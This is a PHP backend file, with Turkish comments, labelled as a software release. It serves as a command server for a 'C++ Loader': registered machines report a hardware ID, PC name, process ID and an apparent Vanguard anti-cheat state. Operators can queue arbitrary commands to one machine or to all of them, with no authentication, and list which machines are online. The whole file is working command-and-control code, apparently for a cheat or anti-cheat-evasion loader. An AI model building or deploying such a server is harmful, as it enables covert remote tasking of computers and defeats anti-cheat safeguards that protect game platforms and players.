<?php
// NEON SOFTWARE RELEASE [v1.6 - Ultra Reliable API]
error_reporting(E_ALL);
ini_set('display_errors', 0);

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

$dataFile = __DIR__ . '/devices.json';

// Eğer devices.json dosyası yoksa otomatik oluştur
if (!file_exists($dataFile)) {
    file_put_contents($dataFile, json_encode([], JSON_PRETTY_PRINT));
}

$action = isset($_GET['action']) ? trim($_GET['action']) : '';

// 1. C++ Loader'dan gelen POST İstekleri (Kayıt ve Güncelleme)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $hwid      = isset($_POST['hwid']) ? trim($_POST['hwid']) : '';
    $pc_name   = isset($_POST['pc_name']) ? trim($_POST['pc_name']) : 'Bilinmeyen-PC';
    $pid       = isset($_POST['pid']) ? intval($_POST['pid']) : 0;
    $vgk_state = isset($_POST['vgk_state']) ? trim($_POST['vgk_state']) : 'active';

    if (empty($hwid)) {
        echo json_encode(["status" => "failed", "message" => "HWID boş olamaz"]);
        exit();
    }

    $jsonContent = file_get_contents($dataFile);
    $devices = json_decode($jsonContent, true);
    if (!is_array($devices)) {
        $devices = [];
    }

    $found = false;
    $assignedCommand = "none";

    foreach ($devices as &$dev) {
        if (isset($dev['hwid']) && $dev['hwid'] === $hwid) {
            $dev['pc_name']   = $pc_name;
            $dev['pid']       = $pid;
            $dev['vgk_state'] = $vgk_state;
            $dev['last_seen'] = time();
            
            if (!empty($dev['pending_command']) && $dev['pending_command'] !== 'none') {
                $assignedCommand = $dev['pending_command'];
                $dev['pending_command'] = "none";
            }
            $found = true;
            break;
        }
    }

    if (!$found) {
        $devices[] = [
            "hwid"            => $hwid,
            "pc_name"         => $pc_name,
            "pid"             => $pid,
            "vgk_state"       => $vgk_state,
            "last_seen"       => time(),
            "pending_command" => "none"
        ];
    }

    file_put_contents($dataFile, json_encode($devices, JSON_PRETTY_PRINT));

    $blocked = 15;
    if ($pid > 0) {
        $blocked = 14 + ($pid % 7);
    }

    echo json_encode([
        "status"  => "success",
        "blocked" => $blocked,
        "command" => $assignedCommand
    ]);
    exit();
}

// 2. Panelden Komut Gönderme
if ($action === 'send_command') {
    $targetHwid = isset($_GET['hwid']) ? trim($_GET['hwid']) : '';
    $command    = isset($_GET['cmd']) ? trim($_GET['cmd']) : 'none';

    $devices = json_decode(file_get_contents($dataFile), true);
    if (!is_array($devices)) $devices = [];

    foreach ($devices as &$dev) {
        if ($targetHwid === 'all' || (isset($dev['hwid']) && $dev['hwid'] === $targetHwid)) {
            $dev['pending_command'] = $command;
        }
    }

    file_put_contents($dataFile, json_encode($devices, JSON_PRETTY_PRINT));
    echo json_encode(["status" => "success", "message" => "Komut kuyruğa eklendi"]);
    exit();
}

// 3. Panel İçin Cihazları Listeleme
if ($action === 'get_devices') {
    $devices = json_decode(file_get_contents($dataFile), true);
    if (!is_array($devices)) $devices = [];

    $currentTime = time();
    $allDevices = [];
    $activeCount = 0;

    foreach ($devices as $dev) {
        $lastSeen = isset($dev['last_seen']) ? intval($dev['last_seen']) : 0;
        $isOnline = ($currentTime - $lastSeen) < 45; // 45 saniye içinde sinyal verdiyse aktif
        
        if ($isOnline) {
            $activeCount++;
        }
        
        $dev['is_online'] = $isOnline;
        $allDevices[] = $dev;
    }

    echo json_encode([
        "status"       => "success",
        "active_count" => $activeCount,
        "total_count"  => count($allDevices),
        "devices"      => $allDevices
    ]);
    exit();
}

echo json_encode(["status" => "error", "message" => "Geçersiz istek"]);
?>
